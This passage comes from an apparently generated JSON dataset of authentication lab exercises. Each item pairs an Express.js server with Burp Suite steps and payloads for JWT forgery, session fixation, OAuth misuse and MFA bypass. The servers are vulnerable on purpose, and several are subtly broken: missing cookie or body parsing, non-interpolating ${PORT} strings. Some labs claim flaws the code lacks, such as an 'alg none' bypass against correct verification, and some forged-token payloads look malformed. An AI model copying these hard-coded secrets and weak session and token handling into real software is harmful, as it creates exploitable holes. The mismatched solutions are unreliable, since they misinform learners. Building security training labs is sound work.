    "Solution Steps": [
      "1. Initiate the OAuth flow using Burp Suite and intercept the authorization code request.",
      "2. Manipulate the request to request a higher scope (e.g., 'admin') rather than the default scope.",
      "3. Exchange the manipulated authorization code for an access token.",
      "4. Send the access token in an API request and gain unauthorized access to the admin panel.",
      "5. Verify access to the admin page, confirming successful exploitation."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const { OAuth2Server } = require('oauth2-server'); const app = express(); const oauth = new OAuth2Server({ model: { getAccessToken: (bearerToken) => { return { accessToken: bearerToken, client: { grants: ['authorization_code'] }, user: { username: 'admin' } }; }, getClient: (clientId, clientSecret) => { return { clientId: 'client123', clientSecret: 'secret123', grants: ['authorization_code'] }; } } }); app.post('/oauth/token', oauth.token()); app.get('/admin', oauth.authenticate(), (req, res) => { if (req.user.username === 'admin') { res.send('Admin panel access granted'); } else { res.status(403).send('Forbidden'); } }); const PORT = 4000; app.listen(PORT, () => console.log('OAuth Misconfiguration Lab running on http://localhost:${PORT}'));"
  },
  {
    "Lab scenario": "Session Fixation via Predictable Session ID",
    "Lab Description": "This lab involves a predictable session ID generation mechanism where the attacker can set their own session ID and impersonate an authenticated user. To solve the lab, set the session ID to Carlos's ID and access his account page.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "1. Log in to your account and capture the session cookie in Burp Suite.",
      "2. Notice that the session ID is a predictable value (e.g., 'user123').",
      "3. Modify the session ID in the cookie to match 'carlos' and send the modified request.",
      "4. Send the modified request to access Carlos's account page.",
      "5. Verify that the page loads, successfully impersonating Carlos."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); const users = { carlos: { password: 'password123', sessionId: 'carlos' } }; app.post('/login', (req, res) => { const { username, password } = req.body; const user = users[username]; if (user && user.password === password) { res.cookie('sessionId', user.sessionId); res.send('Logged in'); } else { res.status(401).send('Invalid credentials'); } }); app.get('/account', (req, res) => { const sessionId = req.cookies.sessionId; const user = Object.keys(users).find(u => users[u].sessionId === sessionId); if (user) { res.send('Welcome to your account, ' + user); } else { res.status(401).send('Unauthorized'); } }); const PORT = 4000; app.listen(PORT, () => console.log('Session Fixation Lab running on http://localhost:${PORT}'));"
  },
  {
    "Lab scenario": "JWT Token Manipulation with Secret Disclosure",
    "Lab Description": "This lab involves a JWT vulnerability where an attacker is able to manipulate the JWT token to impersonate a user. The JWT secret key has been accidentally exposed in the application's source code. The goal is to craft a forged JWT token and use it to gain access to the 'admin' page.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "1. Use Burp Suite's proxy to intercept the login request and capture the JWT token issued for authentication.",
      "2. Inspect the token using a JWT decoder to analyze its structure (Header, Payload, Signature).",
      "3. Identify that the JWT secret is exposed in the source code, allowing you to generate a valid signature.",
      "4. Modify the 'role' in the JWT Payload to 'admin' and re-sign the token using the exposed secret.",
      "5. Replace the original token in the Authorization header with the forged token and resend the request.",
      "6. Verify that you can access the 'admin' page after successfully forging the token."
    ],
    "Vulnerability name": "Authentication",
    "src code": "const express = require('express');\nconst jwt = require('jsonwebtoken');\nconst app = express();\nconst secretKey = 'superSecretKey';\napp.post('/login', (req, res) => {\n  const { username, password } = req.body;\n  if (username === 'admin' && password === 'adminpassword') {\n    const token = jwt.sign({ username: 'admin', role: 'user' }, secretKey);\n    res.json({ token });\n  } else {\n    res.status(401).send('Invalid credentials');\n  }\n});\napp.get('/admin', (req, res) => {\n  const token = req.headers['authorization']?.split(' ')[1];\n  if (token) {\n    try {\n      const decoded = jwt.verify(token, secretKey);\n      if (decoded.role === 'admin') {\n        res.send('Welcome Admin');\n      } else {\n        res.status(403).send('Forbidden');\n      }\n    } catch (err) {\n      res.status(401).send('Invalid Token');\n    }\n  } else {\n    res.status(401).send('No Token Provided');\n  }\n});\nconst PORT = 3000;\napp.listen(PORT, () => console.log('JWT Token Manipulation Lab running on http://localhost:' + PORT));"
  },
  {
    "Lab scenario": "Session Fixation Vulnerability in Authentication",
    "Lab Description": "In this lab, an attacker can set the victim's session ID to a known value before they log in, leading to unauthorized access. The goal is to exploit the session fixation vulnerability by forcing a user to authenticate with a predefined session ID.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Intercept the login request with Burp Suite's Proxy and observe the session ID assigned after login.",
      "2. Use the captured session ID to modify the session cookie and inject it into the victim's request.",
      "3. Force the victim to log in by sending them a specially crafted URL with the pre-set session ID.",
      "4. Observe that upon successful login, the victim’s session ID matches the attacker’s pre-defined session.",
      "5. Access the victim's account page by reusing the valid session ID and confirming the successful attack."
    ],
    "Vulnerability name": "Authentication",
    "src code": "const express = require('express');\nconst session = require('express-session');\nconst app = express();\napp.use(session({ secret: 'sessionSecret', resave: false, saveUninitialized: true }));\napp.post('/login', (req, res) => {\n  const { username, password } = req.body;\n  if (username === 'user' && password === 'password') {\n    req.session.username = 'user';\n    res.send('Login successful');\n  } else {\n    res.status(401).send('Invalid credentials');\n  }\n});\napp.get('/account', (req, res) => {\n  if (req.session.username) {\n    res.send('Account page for ' + req.session.username);\n  } else {\n    res.status(401).send('Not authenticated');\n  }\n});\nconst PORT = 3000;\napp.listen(PORT, () => console.log('Session Fixation Lab running on http://localhost:' + PORT));"
  },
  {
    "Lab scenario": "MFA Bypass via Insecure Backup Codes",
    "Lab Description": "In this lab, the backup codes used for Multi-Factor Authentication (MFA) are poorly protected, allowing an attacker to bypass MFA altogether. The attacker can retrieve these backup codes and use them to authenticate without needing the actual second factor.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "1. During the login attempt, intercept the request with Burp Suite's Proxy and observe the second-factor MFA challenge.",
      "2. Review the backup code generation mechanism in the application's source code or via available documentation.",
      "3. Obtain a set of backup codes by accessing a hidden page or via a brute force attack against the 'forgot backup code' functionality.",
      "4. Use one of the backup codes to bypass the MFA step and successfully log into the account.",
      "5. Verify that you can access the user's account page and complete the lab."
    ],
    "Vulnerability name": "Authentication",
    "src code": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\nconst users = [{ username: 'user', password: 'password123', mfaEnabled: true, backupCodes: ['123456', '654321'] }];\napp.post('/login', (req, res) => {\n  const { username, password, code } = req.body;\n  const user = users.find(u => u.username === username && u.password === password);\n  if (!user) return res.status(401).send('Invalid credentials');\n  if (user.mfaEnabled && !user.backupCodes.includes(code)) return res.status(403).send('Invalid MFA code');\n  res.send('Login successful');\n});\napp.get('/account', (req, res) => {\n  res.send('Account page for user');\n});\nconst PORT = 3000;\napp.listen(PORT, () => console.log('MFA Bypass Lab running on http://localhost:' + PORT));"
  },
  {
    "Lab scenario": "OAuth Misconfiguration Leading to Privilege Escalation",
    "Lab Description": "This lab demonstrates a misconfigured OAuth flow where an attacker can escalate their privileges by exploiting the application's access control. The attacker can manipulate OAuth tokens to gain unauthorized access to sensitive resources.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Identify the OAuth flow by observing requests with Burp Suite and recognizing the endpoint that issues OAuth tokens.",
      "2. Analyze the OAuth tokens to detect any issues with token scope or privilege limitations.",
      "3. Manipulate the OAuth token parameters (such as scope or user ID) to escalate privileges and gain access to resources that should be restricted.",
      "4. Send the modified token to the server and confirm that you can access privileged information or actions.",
      "5. Verify the successful exploitation by completing the attack and accessing the resource."
    ],
    "Vulnerability name": "Authentication",
    "src code": "const express = require('express');\nconst app = express();\napp.post('/oauth/authorize', (req, res) => {\n  const { client_id, redirect_uri, response_type, scope } = req.body;\n  if (client_id === 'trusted-client' && redirect_uri === 'http://localhost/callback') {\n    const token = 'abc123';\n    res.redirect(redirect_uri + '?token=' + token);\n  } else {\n    res.status(400).send('Invalid client');\n  }\n});\napp.post('/api/data', (req, res) => {\n  const token = req.body.token;\n  if (token === 'abc123') {\n    res.json({ data: 'Sensitive data' });\n  } else {\n    res.status(401).send('Unauthorized');\n  }\n});\nconst PORT = 3000;\napp.listen(PORT, () => console.log('OAuth Misconfiguration Lab running on http://localhost:' + PORT));"
  },
  {
    "Lab scenario": "Session fixation vulnerability in user login",
    "Lab Description": "This lab demonstrates a session fixation vulnerability in a web application. The session ID is not regenerated upon login, which allows an attacker to set a fixed session ID for a target user. To solve this lab, fix a session ID for Carlos and log in to his account page.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "1. Intercept the login request using Burp Suite and modify the session ID parameter to a custom value before submitting the request.",
      "2. Log in using Carlos’s credentials and ensure the session ID is set to the attacker’s fixed value.",
      "3. Use Burp Suite’s Repeater tool to send the modified session cookie with the fixed session ID to the server.",
      "4. After logging in, access the 'My Account' page to solve the lab and confirm that the session fixation vulnerability allows access to Carlos’s account."
    ],
    "Vulnerability name": "Session Fixation",
    "src code": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.urlencoded({ extended: true })); let users = [{ username: 'carlos', password: 'password123' }]; let sessions = {}; app.post('/login', (req, res) => { const { username, password, sessionId } = req.body; const user = users.find(u => u.username === username && u.password === password); if (!user) return res.status(401).send('Invalid credentials'); sessions[sessionId] = username; res.send('Logged in'); }); app.get('/my-account', (req, res) => { const sessionId = req.cookies.sessionId; const username = sessions[sessionId]; if (username) { res.send(`Account details for ${username}`); } else { res.status(403).send('Access denied'); } }); const PORT = 4000; app.listen(PORT, () => console.log('Session Fixation Lab running on http://localhost:${PORT}'));",
    "payloads": [
      "POST /login username=carlos&password=password123&sessionId=attackerSessionId",
      "Cookie: sessionId=attackerSessionId"
    ]
  },
  {
    "Lab scenario": "JWT token manipulation to bypass authentication",
    "Lab Description": "In this lab, a web application is vulnerable to JWT token tampering. An attacker can modify the JWT token’s payload to impersonate Carlos and access his account page. The goal is to craft and inject a manipulated JWT to bypass authentication.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Capture the JWT token using Burp Suite while logging in as Carlos.",
      "2. Decode the JWT token using a base64 decoder and inspect the payload to locate user-specific information.",
      "3. Modify the JWT payload to reflect an arbitrary username (e.g., 'admin') and sign the token with a weak secret.",
      "4. Replace the original JWT in the Authorization header with the newly crafted token and submit the request.",
      "5. Verify the access to Carlos's account page with the forged JWT token and solve the lab."
    ],
    "Vulnerability name": "JWT Tampering",
    "src code": "const express = require('express'); const bodyParser = require('body-parser'); const jwt = require('jsonwebtoken'); const app = express(); app.use(bodyParser.json()); let users = [{ username: 'carlos', password: 'securepass123' }]; const secret = 'weaksecret'; app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (!user) return res.status(401).send('Invalid credentials'); const token = jwt.sign({ username: user.username }, secret); res.json({ token }); }); app.get('/my-account', (req, res) => { const token = req.headers['authorization']; jwt.verify(token, secret, (err, decoded) => { if (err) return res.status(403).send('Forbidden'); res.send(`Account details for ${decoded.username}`); }); }); const PORT = 4000; app.listen(PORT, () => console.log('JWT Tampering Lab running on http://localhost:${PORT}'));",
    "payloads": [
      "Authorization: Bearer manipulatedJWTToken"
    ]
  },
  {
    "Lab scenario": "OAuth misconfiguration allowing unauthorized access",
    "Lab Description": "In this lab, OAuth misconfiguration allows unauthorized access to a user's account by exploiting improper token validation. The goal is to use a valid OAuth token to impersonate Carlos and gain access to his account.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "1. Intercept the OAuth token request using Burp Suite to obtain the authorization token for Carlos.",
      "2. Inspect the response for the token and extract the access token.",
      "3. Use the token to send a GET request to the /my-account endpoint while impersonating Carlos.",
      "4. Check the response for account details to confirm that the unauthorized access was successful and solve the lab."
    ],
    "Vulnerability name": "OAuth Misconfiguration",
    "src code": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); let users = [{ username: 'carlos', password: 'secretpass', oauthToken: 'validToken123' }]; app.post('/oauth/token', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (!user) return res.status(401).send('Invalid credentials'); res.json({ access_token: user.oauthToken }); }); app.get('/my-account', (req, res) => { const token = req.headers['authorization']; const user = users.find(u => u.oauthToken === token); if (user) { res.send(`Account details for ${user.username}`); } else { res.status(403).send('Unauthorized access'); } }); const PORT = 4000; app.listen(PORT, () => console.log('OAuth Misconfiguration Lab running on http://localhost:${PORT}'));",
    "payloads": [
      "Authorization: Bearer validToken123"
    ]
  },
  {
    "Lab scenario": "JWT token tampering and impersonation",
    "Lab Description": "In this lab, JWT tokens are used for user authentication. However, the tokens are not properly verified, allowing you to modify the JWT payload to impersonate other users. To solve the lab, impersonate the admin user by modifying a JWT token and access the admin dashboard.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "1. Log in with your own credentials and capture the JWT token in the response using Burp Suite.",
      "2. Decode the JWT token to examine its structure. Identify the signature and payload sections.",
      "3. Use a JWT decoding tool to manipulate the payload. Modify the 'username' field to 'admin'.",
      "4. Re-encode the JWT and send it back in the Authorization header using Burp Suite's Repeater.",
      "5. Access the admin dashboard by navigating to /admin/dashboard using the modified JWT token.",
      "6. Verify that you have successfully accessed the admin panel, confirming that you have impersonated the admin user."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); const secretKey = 'secret'; const users = [{ username: 'user', password: 'password123' }, { username: 'admin', password: 'admin123' }]; app.use(express.json()); app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (!user) return res.status(401).send('Invalid credentials'); const token = jwt.sign({ username: user.username }, secretKey); res.json({ token }); }); app.get('/admin/dashboard', (req, res) => { const token = req.headers['authorization'].split(' ')[1]; jwt.verify(token, secretKey, (err, decoded) => { if (err || decoded.username !== 'admin') return res.status(403).send('Forbidden'); res.send('Admin dashboard'); }); }); const PORT = 4000; app.listen(PORT, () => console.log('JWT Tampering Lab running on http://localhost:${PORT}'));",
    "payloads": [
      "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIn0.d4d3f573a41d99f04793544e3b7f4e17783e7f3f8ef6889b545e428b1aef2b97"
    ]
  },
  {
    "Lab scenario": "Session fixation attack",
    "Lab Description": "This lab is vulnerable to session fixation, where an attacker can set a valid session ID for the victim and force them to authenticate with it. To solve the lab, perform a session fixation attack and access the victim's account page.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Use Burp Suite to intercept the login request and note the session ID provided in the response.",
      "2. Set the session ID in the Cookie header of your request before the victim logs in.",
      "3. Submit the login form with the victim's credentials, ensuring that the session ID you set is included.",
      "4. After the victim successfully logs in, use the same session ID to authenticate as the victim and access their account page.",
      "5. Verify the session by viewing the user's account details, confirming the exploitation of the session fixation vulnerability."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); const users = [{ username: 'user', password: 'password123' }]; app.use(express.json()); app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (!user) return res.status(401).send('Invalid credentials'); const sessionId = req.cookies.session || 'randomSessionId'; res.cookie('session', sessionId); res.send('Logged in'); }); app.get('/account', (req, res) => { const session = req.cookies.session; const user = users.find(u => u.username === 'user' && req.cookies.session === session); if (user) { res.send('Account details for ' + user.username); } else { res.send('Access denied'); } }); const PORT = 3000; app.listen(PORT, () => console.log('Session Fixation Lab running on http://localhost:${PORT}'));",
    "payloads": [
      "randomSessionId"
    ]
  },
  {
    "Lab scenario": "OAuth misconfiguration with sensitive data exposure",
    "Lab Description": "This lab demonstrates an OAuth misconfiguration where an unauthorized user can obtain an access token to access sensitive user data. To solve the lab, exploit the misconfiguration to retrieve sensitive user data by using an OAuth authorization code.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "1. Access the application’s login page and use Burp Suite to capture the OAuth authorization request.",
      "2. Intercept the request and notice that the application incorrectly allows an unauthenticated user to request an authorization code.",
      "3. Modify the authorization code request to include the victim's OAuth client ID and redirect URI.",
      "4. Obtain the authorization code and exchange it for an access token using the authorization code flow.",
      "5. Use the access token to access the user's sensitive data endpoint and confirm successful data retrieval.",
      "6. Verify that unauthorized access was achieved, completing the exploitation of the misconfigured OAuth flow."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.urlencoded({ extended: true })); const oauthClients = [{ clientId: '12345', clientSecret: 'secret', redirectUri: 'http://localhost:4000/callback' }]; app.get('/authorize', (req, res) => { const { clientId, redirectUri } = req.query; const client = oauthClients.find(c => c.clientId === clientId && c.redirectUri === redirectUri); if (client) { const authCode = 'authCode123'; res.redirect(`${redirectUri}?code=${authCode}`); } else { res.status(400).send('Invalid client'); } }); app.get('/callback', (req, res) => { const { code } = req.query; if (code === 'authCode123') { const accessToken = 'accessToken123'; res.send(`Access token: ${accessToken}`); } else { res.status(400).send('Invalid code'); } }); const PORT = 4000; app.listen(PORT, () => console.log('OAuth Misconfiguration Lab running on http://localhost:${PORT}'));",
    "payloads": [
      "clientId=12345&redirectUri=http://localhost:4000/callback",
      "code=authCode123"
    ]
  },
  {
    "Lab scenario": "JWT Token Forgery via Insecure Signature",
    "Lab Description": "This lab is vulnerable to JWT token tampering. The server improperly validates the signature of a JWT, allowing an attacker to forge a new token with elevated privileges. The application uses JWT for user authentication but lacks proper verification of the token signature. To solve this lab, forge a JWT token for the admin user and access their account page.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "1. Capture the JWT token during login using Burp Suite's Proxy.",
      "2. Analyze the JWT structure: header, payload, and signature.",
      "3. Decode the base64-encoded JWT and inspect the payload for a user ID or role.",
      "4. Modify the user ID or role in the payload to 'admin' and re-encode the JWT.",
      "5. Sign the new JWT with an insecure algorithm (e.g., 'none') to bypass signature verification.",
      "6. Send the forged JWT in the Authorization header to access the admin's account page."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); const users = [{ username: 'user', password: 'password123', role: 'user' }]; app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (user) { const token = jwt.sign({ username: user.username, role: user.role }, 'secretKey'); res.json({ token }); } else { res.status(401).send('Invalid credentials'); } }); app.get('/admin', (req, res) => { const token = req.headers['authorization'].split(' ')[1]; jwt.verify(token, 'secretKey', (err, decoded) => { if (err) { return res.status(403).send('Invalid token'); } if (decoded.role !== 'admin') { return res.status(403).send('Access denied'); } res.send('Welcome to the admin page'); }); }); const PORT = 4000; app.listen(PORT, () => console.log('JWT Token Forgery Lab running on http://localhost:' + PORT));",
    "payloads": [
      "eyJhbGciOiAiJ25vbmUifQ.eyJ1c2VybmFtZSI6ICJ1c2VyIiwicm9sZSI6ICJ1c2VyIn0.",
      "eyJhbGciOiAiJ25vbmUifQ.eyJ1c2VybmFtZSI6ICJhZG1pbiIsInJvbGU6ICJhZG1pbiJ9."
    ]
  },
  {
    "Lab scenario": "Session Fixation Vulnerability",
    "Lab Description": "This lab demonstrates a session fixation vulnerability. The server does not regenerate the session ID after login, allowing an attacker to set a valid session ID beforehand. The attacker can then hijack the session of another user by setting the session ID to one they control. To solve the lab, set the session ID to an attacker-controlled value and access the victim’s account.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "1. Log in to your own account and capture the session cookie using Burp Suite's Proxy.",
      "2. Modify the session cookie value using Burp Suite or browser developer tools to a known session ID.",
      "3. Log out of your account and set the session ID of a different user (e.g., 'victim') to the controlled session ID.",
      "4. Log in again with the victim’s credentials and observe that the session remains active under your control.",
      "5. Use the hijacked session to access the victim's account page."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const app = express(); const sessions = {}; app.post('/login', (req, res) => { const { username, password } = req.body; if (username === 'victim' && password === 'password123') { const sessionID = req.cookies.session || 'new-session-id'; sessions[sessionID] = { username }; res.cookie('session', sessionID); res.send('Logged in successfully'); } else { res.status(401).send('Invalid credentials'); } }); app.get('/my-account', (req, res) => { const sessionID = req.cookies.session; if (sessions[sessionID]) { res.send('Account page for ' + sessions[sessionID].username); } else { res.status(403).send('Access denied'); } }); const PORT = 4000; app.listen(PORT, () => console.log('Session Fixation Lab running on http://localhost:' + PORT));",
    "payloads": [
      "session=new-session-id",
      "session=victim-controlled-session-id"
    ]
  },
  {
    "Lab scenario": "OAuth Misconfiguration leading to Authorization Bypass",
    "Lab Description": "This lab involves an OAuth misconfiguration. The authorization server is not properly validating scopes, allowing unauthorized users to access restricted resources. The application uses OAuth for authorization, but the scopes are incorrectly configured. To solve this lab, manipulate the OAuth token to request unauthorized access to the admin's resources.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Use Burp Suite or Postman to intercept the OAuth token request.",
      "2. Analyze the OAuth authorization server's response and extract the access token.",
      "3. Use the access token to request user-specific data from the server's API.",
      "4. Modify the scope of the access token to include 'admin' and send the modified token in the Authorization header.",
      "5. Use the modified token to access the admin's restricted resources."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const oauth2 = require('simple-oauth2'); const app = express(); const oauth2Config = { clientID: 'client-id', clientSecret: 'client-secret', authorizationBaseURL: 'http://localhost:4000/authorize', tokenBaseURL: 'http://localhost:4000/token' }; const users = [{ username: 'admin', password: 'admin123', role: 'admin' }]; app.post('/token', (req, res) => { const { code } = req.body; if (code === 'validCode') { const accessToken = oauth2Config.clientID + ':' + oauth2Config.clientSecret; res.json({ access_token: accessToken }); } else { res.status(400).send('Invalid code'); } }); app.get('/user-data', (req, res) => { const token = req.headers['authorization']; if (token === 'admin') { res.send('Admin data'); } else { res.status(403).send('Access denied'); } }); const PORT = 4000; app.listen(PORT, () => console.log('OAuth Misconfiguration Lab running on http://localhost:' + PORT));",
    "payloads": [
      "code=validCode&grant_type=authorization_code",
      "Authorization: Bearer admin"
    ]
  },
  {
    "Lab scenario": "JWT Token Tampering to Gain Unauthorized Access",
    "Lab Description": "This lab demonstrates a JWT token vulnerability. The application uses JWT tokens for session management but does not validate the claims properly, allowing an attacker to tamper with the token's payload and gain unauthorized access. To solve the lab, tamper with the JWT token and access the user's account page.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "1. Intercept the request with Burp Suite and extract the JWT token from the Authorization header.",
      "2. Decode the JWT token to inspect its payload and header.",
      "3. Modify the payload (e.g., change the user ID or role) to impersonate another user.",
      "4. Re-encode the JWT token and replace the old token with the tampered one in the Authorization header.",
      "5. Send the modified request to the server and verify that access is granted to the user account page."
    ],
    "Vulnerability name": "Authentication",
    "src code": "const express = require('express');\nconst jwt = require('jsonwebtoken');\nconst app = express();\nconst secretKey = 'secret';\n\nlet users = [{ id: '1', username: 'john', password: 'password123' }];\n\napp.use(express.json());\n\napp.post('/login', (req, res) => {\n  const { username, password } = req.body;\n  const user = users.find(u => u.username === username && u.password === password);\n  if (user) {\n    const token = jwt.sign({ id: user.id, username: user.username }, secretKey, { expiresIn: '1h' });\n    res.json({ token });\n  } else {\n    res.status(401).send('Invalid credentials');\n  }\n});\n\napp.get('/account', (req, res) => {\n  const token = req.headers['authorization']?.split(' ')[1];\n  if (!token) return res.status(401).send('Token required');\n  try {\n    const decoded = jwt.verify(token, secretKey);\n    res.send(`Welcome ${decoded.username}!`);\n  } catch (error) {\n    res.status(403).send('Invalid token');\n  }\n});\n\nconst PORT = 4000;\napp.listen(PORT, () => console.log('JWT Token Tampering Lab running on http://localhost:' + PORT));"
  },
  {
    "Lab scenario": "Session Fixation Exploit",
    "Lab Description": "This lab demonstrates a session fixation vulnerability, where an attacker can set the session ID before a user logs in, gaining access to the victim's session after they authenticate. To solve the lab, fixate the session ID, log in as the victim, and access the victim's account page.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Start a session on the vulnerable site and intercept the request with Burp Suite.",
      "2. Modify the session ID in the cookies to a known value (the victim's session ID).",
      "3. Send the request with the fixed session ID and wait for the victim to log in.",
      "4. After the victim logs in, verify if you have access to the victim's account by accessing the account page.",
      "5. The lab is solved when you successfully access the victim's account page."
    ],
    "Vulnerability name": "Authentication",
    "src code": "const express = require('express');\nconst cookieParser = require('cookie-parser');\nconst app = express();\napp.use(cookieParser());\n\nlet users = [{ id: '1', username: 'victim', password: 'password123' }];\n\napp.post('/login', (req, res) => {\n  const { username, password } = req.body;\n  const user = users.find(u => u.username === username && u.password === password);\n  if (user) {\n    res.cookie('sessionId', '123456');\n    res.send(`Logged in as ${username}`);\n  } else {\n    res.status(401).send('Invalid credentials');\n  }\n});\n\napp.get('/account', (req, res) => {\n  const sessionId = req.cookies.sessionId;\n  if (sessionId === '123456') {\n    res.send('Account details for victim');\n  } else {\n    res.status(403).send('Forbidden');\n  }\n});\n\nconst PORT = 4000;\napp.listen(PORT, () => console.log('Session Fixation Lab running on http://localhost:' + PORT));"
  },
  {
    "Lab scenario": "OAuth Misconfiguration - Token Capture",
    "Lab Description": "This lab focuses on an OAuth misconfiguration where an attacker can capture and misuse an OAuth access token to impersonate the victim. The goal is to capture the access token and use it to access a protected resource without authorization.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "1. Set up a listener with Burp Suite to capture the OAuth authorization code in the flow.",
      "2. Intercept the request and extract the authorization code from the URL.",
      "3. Exchange the authorization code for an access token by sending a POST request to the token endpoint.",
      "4. Use the access token in the Authorization header to access a protected API endpoint.",
      "5. The lab is solved when you successfully access the protected resource using the stolen access token."
    ],
    "Vulnerability name": "Authentication",
    "src code": "const express = require('express');\nconst axios = require('axios');\nconst app = express();\nconst oauthClientId = 'client_id';\nconst oauthClientSecret = 'client_secret';\nconst oauthRedirectUri = 'http://localhost:4000/callback';\n\napp.get('/login', (req, res) => {\n  res.redirect(`https://oauthprovider.com/authorize?client_id=${oauthClientId}&redirect_uri=${oauthRedirectUri}&response_type=code`);\n});\n\napp.get('/callback', async (req, res) => {\n  const { code } = req.query;\n  if (code) {\n    const response = await axios.post('https://oauthprovider.com/token', {\n      client_id: oauthClientId,\n      client_secret: oauthClientSecret,\n      code,\n      redirect_uri: oauthRedirectUri,\n      grant_type: 'authorization_code'\n    });\n    const { access_token } = response.data;\n    res.send(`Access token: ${access_token}`);\n  } else {\n    res.status(400).send('Authorization code missing');\n  }\n});\n\napp.get('/protected', (req, res) => {\n  const accessToken = req.headers['authorization']?.split(' ')[1];\n  if (accessToken === 'valid_oauth_token') {\n    res.send('Protected data');\n  } else {\n    res.status(403).send('Forbidden');\n  }\n});\n\nconst PORT = 4000;\napp.listen(PORT, () => console.log('OAuth Misconfiguration Lab running on http://localhost:' + PORT));"
  },
  {
    "Lab scenario": "Session fixation attack",
    "Lab Description": "This lab's session management is vulnerable to session fixation. A user can be forced to use a fixed session ID, allowing an attacker to hijack the session after login. The application does not regenerate the session ID after authentication. To solve the lab, you need to manipulate the session ID to hijack Carlos’s account.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "1. With Burp Suite running, start an active session on the website. Observe the session cookie used by the application.",
      "2. Try to manually set a fixed session ID before login, using the session cookie value in the HTTP request.",
      "3. Log in with the victim’s credentials while maintaining the fixed session ID.",
      "4. Confirm the session ID persists post-login and verify access to the user's account page.",
      "5. Validate the exploit by accessing Carlos’s account using the fixed session ID."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); app.use(bodyParser.urlencoded({ extended: true })); let sessions = {}; const users = [{ username: 'carlos', password: 'password123' }]; app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (user) { let sessionId = req.cookies.sessionId || 'fixed-session'; sessions[sessionId] = username; res.cookie('sessionId', sessionId); res.send('Logged in'); } else { res.status(401).send('Invalid credentials'); } }); app.get('/my-account', (req, res) => { const sessionId = req.cookies.sessionId; if (sessions[sessionId]) { res.send('Welcome ' + sessions[sessionId]); } else { res.status(403).send('Access denied'); } }); const PORT = 4000; app.listen(PORT, () => console.log('Session Fixation Lab running on http://localhost:' + PORT));",
    "payloads": [
      "sessionId=fixed-session",
      "sessionId=12345"
    ]
  },
  {
    "Lab scenario": "JWT tampering and session hijacking",
    "Lab Description": "This lab features a vulnerable JWT implementation where the application does not properly validate the signature of the token. An attacker can modify the payload to impersonate any user. To solve the lab, you need to modify the JWT to access Carlos's account.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Log in using your credentials and capture the JWT token in the response headers.",
      "2. Using a tool like Burp Suite or Postman, decode the JWT to view its payload and signature.",
      "3. Modify the payload to change the username to 'carlos' and re-encode the token.",
      "4. In Burp Suite or Postman, replace the old JWT in the Authorization header with the tampered token.",
      "5. Send the modified request to the server and access Carlos’s account page."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); const secretKey = 'mysecretkey'; app.use(express.json()); const users = [{ username: 'carlos', password: 'password123' }]; app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (user) { const token = jwt.sign({ username }, secretKey); res.json({ token }); } else { res.status(401).send('Invalid credentials'); } }); app.get('/my-account', (req, res) => { const token = req.headers['authorization']; try { const decoded = jwt.verify(token, secretKey); if (decoded) { res.send('Welcome ' + decoded.username); } } catch (err) { res.status(403).send('Access denied'); } }); const PORT = 4000; app.listen(PORT, () => console.log('JWT Tampering Lab running on http://localhost:' + PORT));",
    "payloads": [
      "Authorization: Bearer tampered-jwt-token",
      "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImNhcmxvcyJ9.-cHZV82kmWmHE19sZjsi7gQW-tbvvV47vhfsdLxlw_A"
    ]
  },
  {
